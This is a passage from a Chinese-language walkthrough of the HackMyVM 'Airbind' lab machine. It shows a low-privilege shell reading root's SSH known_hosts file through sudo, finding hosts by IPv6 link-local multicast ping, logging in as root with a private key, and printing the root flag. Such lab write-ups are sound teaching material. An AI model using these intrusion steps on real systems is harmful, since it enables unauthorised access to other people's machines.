AAAAB3NzaC1yc2EAAAADAQABAAABgQDWUGR/uzPO05+HKSkUJURgu2wzSlDXxGfD0SA6AHlg1uIRrLu/qvHX7gU90RoIcC1bxwkKhOnaejLfvLVabaoiI+YW2h+gMhweT+wLuaUShJLnPLKVswRvYv3q0QfUEzoQf1PzXL1pVi+2AKLltN2IyFHhP/dcthRQ2mEPza6SNZt4XNKpChgXd7obcEYvIwDf0CueTC/kujNQCvBq2FNtmEgXkcmk9gGV908UNtzSszpkP9fyALiws9kq/KtpUw/pRhHLmouR+4w1ibVzOa3M4MaaoFzKAKtiIr7vX9aXkMCx+QeQ/iEOmIJOPHHRWZX3jePp1ysH2n/eJbd6Y6ucYDztdNqsapPT7XC3qEVjbqrPXVlWhGywePTVY2soFlKj0ymgTPGLRjWuPoNBDPWH1lJrLh37c0I4n5AF8Da2X5x6bWrbgeExhYqguafr/VkrsjPmzUmMjcILUWh0HNnZtEWy6Po8a9r4n0d3qsodWpu4/5kxUxig8Rk42/77rq8=\n|<span class=\"hljs-number\">1</span>|DBJ5N5irDCxODPU5XXnjFX9VtQ0=|L2517HDjl8ItNdGfNAe6k6JKCrw= ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLuHH80SwA8Qff3pGOY4aBesL0Aeesw6jqX+pbtR9O7w8jlbyNhuHmjjABb/34BxFp2oBx8o5xuZVXS1cE9nAlE=\n\nwww-data@ubuntu:/tmp$ sudo cat /root/.ssh/known_hosts.old\n|<span class=\"hljs-number\">1</span>|BUp6YxwESRbkME4kT/hGWmWcQo4=|SdbdZ8D3hrDg7Ir0JQJh6z34lPg= ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICKFE9s2IvPGAJ7Pt0kSC8t9OXYUrueJQQplSC2wbYtY\n</code></pre>\n<p>没看出来是肾么？</p>\n<p>然后发现<code>ip add</code> 下还有<code>IPv6</code>地址，可能是<code>ssh</code>仅允许<code>IPv6</code>了</p>\n<pre><code class=\"hljs language-python\">www-data@ubuntu:/tmp$ ip add\n<span class=\"hljs-number\">1</span>: lo: &#x3C;LOOPBACK,UP,LOWER_UP> mtu <span class=\"hljs-number\">65536</span> qdisc noqueue state UNKNOWN group default qlen <span class=\"hljs-number\">1000</span>\n    link/loopback <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span> brd <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>\n    inet <span class=\"hljs-number\">127.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.1</span>/<span class=\"hljs-number\">8</span> scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::<span class=\"hljs-number\">1</span>/<span class=\"hljs-number\">128</span> scope host \n       valid_lft forever preferred_lft forever\n<span class=\"hljs-number\">2</span>: eth0@if8: &#x3C;BROADCAST,MULTICAST,UP,LOWER_UP> mtu <span class=\"hljs-number\">1500</span> qdisc noqueue state UP group default qlen <span class=\"hljs-number\">1000</span>\n    link/ether dc:a1:f7:<span class=\"hljs-number\">82</span>:<span class=\"hljs-number\">76</span>:<span class=\"hljs-number\">13</span> brd ff:ff:ff:ff:ff:ff link-netnsid <span class=\"hljs-number\">0</span>\n    inet <span class=\"hljs-number\">10.0</span><span class=\"hljs-number\">.3</span><span class=\"hljs-number\">.241</span>/<span class=\"hljs-number\">24</span> brd <span class=\"hljs-number\">10.0</span><span class=\"hljs-number\">.3</span><span class=\"hljs-number\">.255</span> scope <span class=\"hljs-keyword\">global</span> eth0\n       valid_lft forever preferred_lft forever\n    inet6 fe80::dea1:f7ff:fe82:<span class=\"hljs-number\">7613</span>/<span class=\"hljs-number\">64</span> scope link \n       valid_lft forever preferred_lft forever\n<span class=\"hljs-number\">3</span>: wlan0: &#x3C;NO-CARRIER,BROADCAST,MULTICAST,UP> mtu <span class=\"hljs-number\">1500</span> qdisc mq state DOWN group default qlen <span class=\"hljs-number\">1000</span>\n    link/ether 02:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span> brd ff:ff:ff:ff:ff:ff\n<span class=\"hljs-number\">6</span>: ap0: &#x3C;BROADCAST,MULTICAST> mtu <span class=\"hljs-number\">1500</span> qdisc noop state DOWN group default qlen <span class=\"hljs-number\">1000</span>\n    link/ether <span class=\"hljs-number\">42</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span> brd ff:ff:ff:ff:ff:ff\n</code></pre>\n<h3><strong>使用 <code>ping6</code> 与链路本地地址广播</strong></h3>\n<p>通过向链路本地地址的 “所有节点多播组” 发送 ICMPv6 请求，可以发现同一链路上的所有 IPv6 设备。（<a href=\"https://xyaxxya.github.io/2024/12/17/HackMyVM%20Airbind/%EF%BC%89\">https://xyaxxya.github.io/2024/12/17/HackMyVM%20Airbind/）</a></p>\n<pre><code class=\"hljs language-python\">ping6 -I eth1 ff02::<span class=\"hljs-number\">1</span>                                                     \nping6: Warning: source address might be selected on device other than: eth1   \nPING ff02::<span class=\"hljs-number\">1</span> (ff02::<span class=\"hljs-number\">1</span>) <span class=\"hljs-keyword\">from</span> :: eth1: <span class=\"hljs-number\">56</span> data <span class=\"hljs-built_in\">bytes</span>                            \n<span class=\"hljs-number\">64</span> <span class=\"hljs-built_in\">bytes</span> <span class=\"hljs-keyword\">from</span> fe80::5b37:<span class=\"hljs-number\">1303</span>:d04f:<span class=\"hljs-number\">5988</span>%eth1: icmp_seq=<span class=\"hljs-number\">1</span> ttl=<span class=\"hljs-number\">64</span> time=<span class=\"hljs-number\">0.322</span> ms \n<span class=\"hljs-number\">64</span> <span class=\"hljs-built_in\">bytes</span> <span class=\"hljs-keyword\">from</span> fe80::a00:27ff:fe20:ba03%eth1: icmp_seq=<span class=\"hljs-number\">1</span> ttl=<span class=\"hljs-number\">64</span> time=<span class=\"hljs-number\">1.65</span> ms  \n<span class=\"hljs-number\">64</span> <span class=\"hljs-built_in\">bytes</span> <span class=\"hljs-keyword\">from</span> fe80::5b37:<span class=\"hljs-number\">1303</span>:d04f:<span class=\"hljs-number\">5988</span>%eth1: icmp_seq=<span class=\"hljs-number\">2</span> ttl=<span class=\"hljs-number\">64</span> time=<span class=\"hljs-number\">0.056</span> ms \n<span class=\"hljs-number\">64</span> <span class=\"hljs-built_in\">bytes</span> <span class=\"hljs-keyword\">from</span> fe80::a00:27ff:fe20:ba03%eth1: icmp_seq=<span class=\"hljs-number\">2</span> ttl=<span class=\"hljs-number\">64</span> time=<span class=\"hljs-number\">0.567</span> ms \n<span class=\"hljs-number\">64</span> <span class=\"hljs-built_in\">bytes</span> <span class=\"hljs-keyword\">from</span> fe80::5b37:<span class=\"hljs-number\">1303</span>:d04f:<span class=\"hljs-number\">5988</span>%eth1: icmp_seq=<span class=\"hljs-number\">3</span> ttl=<span class=\"hljs-number\">64</span> time=<span class=\"hljs-number\">0.071</span> ms \n<span class=\"hljs-number\">64</span> <span class=\"hljs-built_in\">bytes</span> <span class=\"hljs-keyword\">from</span> fe80::a00:27ff:fe20:ba03%eth1: icmp_seq=<span class=\"hljs-number\">3</span> ttl=<span class=\"hljs-number\">64</span> time=<span class=\"hljs-number\">0.798</span> ms\n</code></pre>\n<p>就两个地址，都测试一下就行了</p>\n<pre><code class=\"hljs language-python\">ssh fe80::a00:27ff:fe20:ba03%eth1 -i id_rsa\nLinux airbind <span class=\"hljs-number\">6.1</span><span class=\"hljs-number\">.0</span>-<span class=\"hljs-number\">18</span>-amd64 <span class=\"hljs-comment\">#1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64</span>\n\nThe programs included <span class=\"hljs-keyword\">with</span> the Debian GNU/Linux system are free software;\nthe exact distribution terms <span class=\"hljs-keyword\">for</span> each program are described <span class=\"hljs-keyword\">in</span> the\nindividual files <span class=\"hljs-keyword\">in</span> /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes <span class=\"hljs-keyword\">with</span> ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nroot@airbind:~<span class=\"hljs-comment\"># </span>\n</code></pre>\n<h3>RootFlag</h3>\n<pre><code class=\"hljs language-python\">root@airbind:~<span class=\"hljs-comment\"># cat root.txt </span>\n2bd693135712f88726c22770278a2dcf\n</code></pre>","title":"HackMyVM  -  Airbind","date":"2025-04-03","updated":"2025-04-03","comments":true,"tags":["HackMyVM","Linux靶机"],"categories":"靶机","description":"Airbind. https://hackmyvm.eu/machines/machine.php?vm=Airbind Notes: Enjoy it. 信息收集 SSH端口提示被过滤 没扫描出来系统信息 渗透 访问web页面，显示wallos ，通过查找发现是开源的个人订阅追踪器 https:/..."},"recentPosts":[{"id":"TheHackersLabsLuna","title":"TheHackersLabs - Luna","date":"2025-10-28","isEncrypted":false,"year":"2025","month":"10","day":"28"},{"id":"TheHackersLabsTHLPWN","title":"TheHackersLabs - THLPWN","date":"2025-10-27","isEncrypted":false,"year":"2025","month":"10","day":"27"},{"id":"念念碎","title":"念念碎","date":"2025-10-26","isEncrypted":false,"year":"2025","month":"10","day":"26"},{"id":"HackTheBoxSeason9 - Conversor","title":"HackTheBox - Season9 - Conversor","date":"2025-10-26","isEncrypted":true,"year":"2025","month":"10","day":"26"},{"id":"HackMyVMSysadmin","title":"HackMyVM - Sysadmin","date":"2025-10-25","isEncrypted":false,"year":"2025","month":"10","day":"25"},{"id":"HackTheBoxSeason8 - Artificial","title":"HackTheBox - Machine - Artificial","date":"2025-06-28","isEncrypted":false,"year":"2025","month":"10","day":"25"},{"id":"HackTheBoxSeason8 - Puppy","title":"HackTheBox - Machine - Puppy","date":"2025-05-19","isEncrypted":false,"year":"2025","month":"10","day":"25"}]},"__N_SSG":true}